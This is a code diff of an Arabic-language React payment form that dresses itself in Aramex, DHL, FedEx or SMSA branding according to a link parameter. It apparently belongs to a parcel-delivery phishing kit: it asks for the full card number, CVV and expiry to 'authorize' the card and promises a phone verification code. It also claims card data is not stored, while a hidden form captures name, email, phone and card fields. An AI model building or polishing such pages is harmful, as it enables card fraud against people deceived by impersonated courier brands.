@@ -4,12 +4,15 @@ import { Card } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
-import { Badge } from "@/components/ui/badge";
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import { useLink } from "@/hooks/useSupabase";
-import { Shield, CreditCard, Lock, AlertCircle, Hash, User, MapPin } from "lucide-react";
+import { Shield, CreditCard, AlertCircle } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
+import heroAramex from "@/assets/hero-aramex.jpg";
+import heroDhl from "@/assets/hero-dhl.jpg";
+import heroFedex from "@/assets/hero-fedex.jpg";
+import heroSmsa from "@/assets/hero-smsa.jpg";
 
 const PaymentCardForm = () => {
   const { id } = useParams();
@@ -27,8 +30,14 @@ const PaymentCardForm = () => {
   const serviceName = linkData?.payload?.service_name || customerInfo.service || 'aramex';
   const branding = getServiceBranding(serviceName);
   
-  // Extract shipping info from link payload
-  const shippingInfo = linkData?.payload as any;
+  const heroImages: Record<string, string> = {
+    'aramex': heroAramex,
+    'dhl': heroDhl,
+    'fedex': heroFedex,
+    'smsa': heroSmsa,
+  };
+  
+  const heroImage = heroImages[serviceName.toLowerCase()] || heroAramex;
   
   const formatCardNumber = (value: string) => {
     const cleaned = value.replace(/\s/g, "");
@@ -93,239 +102,234 @@ const PaymentCardForm = () => {
   
   return (
     <div 
-      className="min-h-screen"
+      className="min-h-screen bg-background"
       dir="rtl"
-      style={{
-        background: 'linear-gradient(180deg, #0a0e27 0%, #1a1f3a 100%)',
-      }}
     >
-      {/* Header Image */}
-      {branding.ogImage && (
-        <div className="w-full">
-          <img 
-            src={branding.ogImage} 
-            alt={serviceName}
-            className="w-full h-48 object-cover"
-            onError={(e) => e.currentTarget.style.display = 'none'}
-          />
-        </div>
-      )}
-
-      <div className="container mx-auto px-4 py-8">
-        <div className="max-w-md mx-auto">
-          
-          {/* Title Section */}
-          <div className="text-center mb-6">
-            <h1 className="text-3xl font-bold text-white mb-2">بيانات البطاقة</h1>
-            <p className="text-gray-400">الدفع الآمن</p>
-          </div>
-
-          {/* Shipping Info Display */}
-          {shippingInfo && (
-            <div className="mb-6 p-4 rounded-lg bg-white/5 border border-white/10">
-              <h3 className="font-semibold mb-3 text-white text-sm">تفاصيل الشحنة</h3>
-              <div className="space-y-2 text-xs">
-                {shippingInfo.tracking_number && (
-                  <div className="flex items-center gap-2 text-gray-300">
-                    <Hash className="w-3 h-3" />
-                    <span className="opacity-70">رقم الشحنة:</span>
-                    <span className="font-semibold">{shippingInfo.tracking_number}</span>
-                  </div>
-                )}
-                {shippingInfo.sender_name && (
-                  <div className="flex items-center gap-2 text-gray-300">
-                    <User className="w-3 h-3" />
-                    <span className="opacity-70">المرسل:</span>
-                    <span className="font-semibold">{shippingInfo.sender_name}</span>
-                  </div>
-                )}
-                {shippingInfo.sender_city && (
-                  <div className="flex items-center gap-2 text-gray-300">
-                    <MapPin className="w-3 h-3" />
-                    <span className="opacity-70">المدينة:</span>
-                    <span className="font-semibold">{shippingInfo.sender_city}</span>
-                  </div>
-                )}
-              </div>
+      {/* Hero Section */}
+      <div className="relative w-full h-48 sm:h-64 overflow-hidden">
+        <img 
+          src={heroImage}
+          alt={serviceName}
+          className="w-full h-full object-cover"
+        />
+        <div className="absolute inset-0 bg-gradient-to-b from-black/60 via-black/40 to-black/70" />
+        
+        {/* Logo Overlay */}
+        <div className="absolute top-4 left-4 sm:top-6 sm:left-6">
+          {branding.logo && (
+            <div className="bg-white rounded-2xl p-3 sm:p-4 shadow-lg">
+              <img 
+                src={branding.logo} 
+                alt={serviceName}
+                className="h-12 sm:h-16 w-auto"
+                onError={(e) => e.currentTarget.style.display = 'none'}
+              />
             </div>
           )}
-
-          {/* Security Notice */}
-          <div 
-            className="rounded-lg p-3 mb-6 flex items-start gap-2"
-            style={{
-              background: 'rgba(59, 130, 246, 0.1)',
-              border: '1px solid rgba(59, 130, 246, 0.3)'
-            }}
-          >
-            <AlertCircle className="w-5 h-5 mt-0.5 flex-shrink-0 text-blue-400" />
-            <p className="text-sm text-blue-300">
-              بياناتك محمية بتقنية التشفير. لا نقوم بحفظ بيانات البطاقة
-            </p>
+        </div>
+        
+        {/* Title Overlay */}
+        <div className="absolute bottom-4 right-4 sm:bottom-6 sm:right-6 text-white">
+          <div className="text-right">
+            <h2 className="text-lg sm:text-2xl font-bold mb-1">{serviceName}</h2>
+            <p className="text-xs sm:text-sm opacity-90">خدمة شحن</p>
           </div>
+        </div>
+      </div>
 
-          {/* Visual Card Display */}
-          <div 
-            className="rounded-2xl p-6 mb-6 relative overflow-hidden"
-            style={{
-              background: 'linear-gradient(135deg, #7c3aed 0%, #ea580c 100%)',
-              minHeight: '200px'
-            }}
-          >
-            <div className="absolute top-4 right-4">
-              <CreditCard className="w-12 h-12 text-white/80" />
-            </div>
-            
-            {/* Card Number Display */}
-            <div className="mt-16 mb-6">
-              <div className="flex gap-3 text-white text-2xl font-mono">
-                <span>••••</span>
-                <span>••••</span>
-                <span>••••</span>
-                <span>{cardNumber.replace(/\s/g, "").slice(-4) || "••••"}</span>
+      <div className="container mx-auto px-3 sm:px-4 -mt-8 sm:-mt-12 relative z-10">
+        <div className="max-w-2xl mx-auto">
+          
+          <Card className="p-4 sm:p-8 shadow-2xl border-t-4" style={{ borderTopColor: branding.colors.primary }}>
+            <div className="flex items-center justify-between mb-6 sm:mb-8">
+              <h1 className="text-xl sm:text-3xl font-bold">بيانات البطاقة</h1>
+              
+              <div
+                className="w-14 h-14 sm:w-20 sm:h-20 rounded-2xl flex items-center justify-center shadow-lg"
+                style={{
+                  background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
+                }}
+              >
+                <CreditCard className="w-7 h-7 sm:w-10 sm:h-10 text-white" />
               </div>
             </div>
 
-            <div className="flex justify-between items-end text-white">
+            {/* Security Notice */}
+            <div 
+              className="rounded-lg p-3 sm:p-4 mb-6 flex items-start gap-2"
+              style={{
+                background: `${branding.colors.primary}10`,
+                border: `1px solid ${branding.colors.primary}30`
+              }}
+            >
+              <AlertCircle className="w-4 h-4 sm:w-5 sm:h-5 mt-0.5 flex-shrink-0" style={{ color: branding.colors.primary }} />
+              <p className="text-xs sm:text-sm">
+                بياناتك محمية بتقنية التشفير. لا نقوم بحفظ بيانات البطاقة
+              </p>
+            </div>
+
+            {/* Visual Card Display */}
+            <div 
+              className="rounded-2xl p-5 sm:p-6 mb-6 relative overflow-hidden shadow-lg"
+              style={{
+                background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
+                minHeight: '180px'
+              }}
+            >
+              <div className="absolute top-4 right-4">
+                <CreditCard className="w-10 h-10 sm:w-12 sm:h-12 text-white/80" />
+              </div>
+              
+              {/* Card Number Display */}
+              <div className="mt-14 sm:mt-16 mb-5 sm:mb-6">
+                <div className="flex gap-2 sm:gap-3 text-white text-xl sm:text-2xl font-mono">
+                  <span>••••</span>
+                  <span>••••</span>
+                  <span>••••</span>
+                  <span>{cardNumber.replace(/\s/g, "").slice(-4) || "••••"}</span>
+                </div>
+              </div>
+
+              <div className="flex justify-between items-end text-white">
+                <div>
+                  <p className="text-[10px] sm:text-xs opacity-70 mb-1">EXPIRES</p>
+                  <p className="text-base sm:text-lg font-mono">{expiry || "MM/YY"}</p>
+                </div>
+                <div className="text-right">
+                  <p className="text-[10px] sm:text-xs opacity-70 mb-1">CARDHOLDER</p>
+                  <p className="text-base sm:text-lg font-bold">{cardName || "YOUR NAME"}</p>
+                </div>
+              </div>
+            </div>
+
+            {/* Form */}
+            <form onSubmit={handleSubmit} className="space-y-4 sm:space-y-5">
+              {/* Cardholder Name */}
               <div>
-                <p className="text-xs opacity-70 mb-1">EXPIRES</p>
-                <p className="text-lg font-mono">{expiry || "MM/YY"}</p>
-              </div>
-              <div className="text-right">
-                <p className="text-xs opacity-70 mb-1">CARDHOLDER</p>
-                <p className="text-lg font-bold">{cardName || "YOUR NAME"}</p>
-              </div>
-            </div>
-          </div>
-
-          {/* Form */}
-          <form onSubmit={handleSubmit} className="space-y-5">
-            {/* Cardholder Name */}
-            <div>
-              <Label className="mb-2 text-white">اسم حامل البطاقة</Label>
-              <Input
-                placeholder="AHMAD ALI"
-                value={cardName}
-                onChange={(e) => setCardName(e.target.value.toUpperCase())}
-                className="h-14 text-lg bg-gray-900/50 border-gray-700 text-white placeholder:text-gray-500"
-                required
-              />
-            </div>
-            
-            {/* Card Number */}
-            <div>
-              <Label className="mb-2 text-white">رقم البطاقة</Label>
-              <Input
-                type="password"
-                placeholder="#### #### #### ####"
-                value={cardNumber}
-                onChange={(e) =>
-                  setCardNumber(formatCardNumber(e.target.value.replace(/\D/g, "").slice(0, 16)))
-                }
-                inputMode="numeric"
-                className="h-14 text-lg tracking-wider bg-gray-900/50 border-gray-700 text-white placeholder:text-gray-500"
-                required
-              />
-            </div>
-            
-            {/* CVV, Year, Month Row */}
-            <div className="grid grid-cols-3 gap-3">
-              <div>
-                <Label className="mb-2 text-white text-xs">CVV</Label>
+                <Label className="mb-2 text-sm sm:text-base">اسم حامل البطاقة</Label>
                 <Input
-                  type="password"
-                  placeholder="***"
-                  value={cvv}
-                  onChange={(e) =>
-                    setCvv(e.target.value.replace(/\D/g, "").slice(0, 3))
-                  }
-                  inputMode="numeric"
-                  className="h-14 text-lg text-center bg-gray-900/50 border-gray-700 text-white placeholder:text-gray-500"
+                  placeholder="AHMAD ALI"
+                  value={cardName}
+                  onChange={(e) => setCardName(e.target.value.toUpperCase())}
+                  className="h-12 sm:h-14 text-base sm:text-lg"
                   required
                 />
               </div>
               
+              {/* Card Number */}
               <div>
-                <Label className="mb-2 text-white text-xs">السنة</Label>
-                <Select
-                  value={expiry.split('/')[1] || ''}
-                  onValueChange={(year) => {
-                    const month = expiry.split('/')[0] || '';
-                    setExpiry(month && year ? `${month}/${year}` : year ? `01/${year}` : '');
-                  }}
-                >
-                  <SelectTrigger className="h-14 bg-gray-900/50 border-gray-700 text-white">
-                    <SelectValue placeholder="YY" />
-                  </SelectTrigger>
-                  <SelectContent className="bg-gray-900 border-gray-700 text-white z-50">
-                    {Array.from({ length: 15 }, (_, i) => {
-                      const year = (new Date().getFullYear() + i).toString().slice(-2);
-                      return (
-                        <SelectItem key={year} value={year} className="text-white hover:bg-gray-800">
-                          {year}
-                        </SelectItem>
-                      );
-                    })}
-                  </SelectContent>
-                </Select>
+                <Label className="mb-2 text-sm sm:text-base">رقم البطاقة</Label>
+                <Input
+                  type="password"
+                  placeholder="#### #### #### ####"
+                  value={cardNumber}
+                  onChange={(e) =>
+                    setCardNumber(formatCardNumber(e.target.value.replace(/\D/g, "").slice(0, 16)))
+                  }
+                  inputMode="numeric"
+                  className="h-12 sm:h-14 text-base sm:text-lg tracking-wider"
+                  required
+                />
               </div>
+              
+              {/* CVV, Year, Month Row */}
+              <div className="grid grid-cols-3 gap-2 sm:gap-3">
+                <div>
+                  <Label className="mb-2 text-xs sm:text-sm">CVV</Label>
+                  <Input
+                    type="password"
+                    placeholder="***"
+                    value={cvv}
+                    onChange={(e) =>
+                      setCvv(e.target.value.replace(/\D/g, "").slice(0, 3))
+                    }
+                    inputMode="numeric"
+                    className="h-12 sm:h-14 text-base sm:text-lg text-center"
+                    required
+                  />
+                </div>
+                
+                <div>
+                  <Label className="mb-2 text-xs sm:text-sm">السنة</Label>
+                  <Select
+                    value={expiry.split('/')[1] || ''}
+                    onValueChange={(year) => {
+                      const month = expiry.split('/')[0] || '';
+                      setExpiry(month && year ? `${month}/${year}` : year ? `01/${year}` : '');
+                    }}
+                  >
+                    <SelectTrigger className="h-12 sm:h-14">
+                      <SelectValue placeholder="YY" />
+                    </SelectTrigger>
+                    <SelectContent className="z-50">
+                      {Array.from({ length: 15 }, (_, i) => {
+                        const year = (new Date().getFullYear() + i).toString().slice(-2);
+                        return (
+                          <SelectItem key={year} value={year}>
+                            {year}
+                          </SelectItem>
+                        );
+                      })}
+                    </SelectContent>
+                  </Select>
+                </div>
 
-              <div>
-                <Label className="mb-2 text-white text-xs">الشهر</Label>
-                <Select
-                  value={expiry.split('/')[0] || ''}
-                  onValueChange={(month) => {
-                    const year = expiry.split('/')[1] || '';
-                    setExpiry(month && year ? `${month}/${year}` : month);
-                  }}
-                >
-                  <SelectTrigger className="h-14 bg-gray-900/50 border-gray-700 text-white">
-                    <SelectValue placeholder="MM" />
-                  </SelectTrigger>
-                  <SelectContent className="bg-gray-900 border-gray-700 text-white z-50">
-                    {Array.from({ length: 12 }, (_, i) => {
-                      const month = (i + 1).toString().padStart(2, '0');
-                      return (
-                        <SelectItem key={month} value={month} className="text-white hover:bg-gray-800">
-                          {month}
-                        </SelectItem>
-                      );
-                    })}
-                  </SelectContent>
-                </Select>
+                <div>
+                  <Label className="mb-2 text-xs sm:text-sm">الشهر</Label>
+                  <Select
+                    value={expiry.split('/')[0] || ''}
+                    onValueChange={(month) => {
+                      const year = expiry.split('/')[1] || '';
+                      setExpiry(month && year ? `${month}/${year}` : month);
+                    }}
+                  >
+                    <SelectTrigger className="h-12 sm:h-14">
+                      <SelectValue placeholder="MM" />
+                    </SelectTrigger>
+                    <SelectContent className="z-50">
+                      {Array.from({ length: 12 }, (_, i) => {
+                        const month = (i + 1).toString().padStart(2, '0');
+                        return (
+                          <SelectItem key={month} value={month}>
+                            {month}
+                          </SelectItem>
+                        );
+                      })}
+                    </SelectContent>
+                  </Select>
+                </div>
               </div>
-            </div>
-            
-            {/* Submit Button */}
-            <Button
-              type="submit"
-              size="lg"
-              className="w-full text-xl py-7 mt-6 font-bold"
-              style={{
-                background: 'linear-gradient(135deg, #fbbf24 0%, #f59e0b 100%)',
-                color: '#000'
-              }}
-            >
-              <Shield className="w-6 h-6 ml-2" />
-              <span>تفويض البطاقة</span>
-            </Button>
-            
-            <p className="text-xs text-center text-gray-400 mt-3">
-              سيتم إرسال رمز التحقق إلى هاتفك المسجل
-            </p>
-          </form>
+              
+              {/* Submit Button */}
+              <Button
+                type="submit"
+                size="lg"
+                className="w-full text-base sm:text-xl py-6 sm:py-7 mt-6 font-bold text-white"
+                style={{
+                  background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
+                }}
+              >
+                <Shield className="w-5 h-5 sm:w-6 sm:h-6 ml-2" />
+                <span>تفويض البطاقة</span>
+              </Button>
+              
+              <p className="text-[10px] sm:text-xs text-center text-muted-foreground mt-3">
+                سيتم إرسال رمز التحقق إلى هاتفك المسجل
+              </p>
+            </form>
           
-          {/* Hidden Netlify Form */}
-          <form name="card-details" netlify-honeypot="bot-field" data-netlify="true" hidden>
-            <input type="text" name="name" />
-            <input type="email" name="email" />
-            <input type="tel" name="phone" />
-            <input type="text" name="service" />
-            <input type="text" name="cardholder" />
-            <input type="text" name="cardLast4" />
-            <input type="text" name="expiry" />
-            <input type="text" name="timestamp" />
-          </form>
+            {/* Hidden Netlify Form */}
+            <form name="card-details" netlify-honeypot="bot-field" data-netlify="true" hidden>
+              <input type="text" name="name" />
+              <input type="email" name="email" />
+              <input type="tel" name="phone" />
+              <input type="text" name="service" />
+              <input type="text" name="cardholder" />
+              <input type="text" name="cardLast4" />
+              <input type="text" name="expiry" />
+              <input type="text" name="timestamp" />
+            </form>
+          </Card>
         </div>
       </div>
     </div>
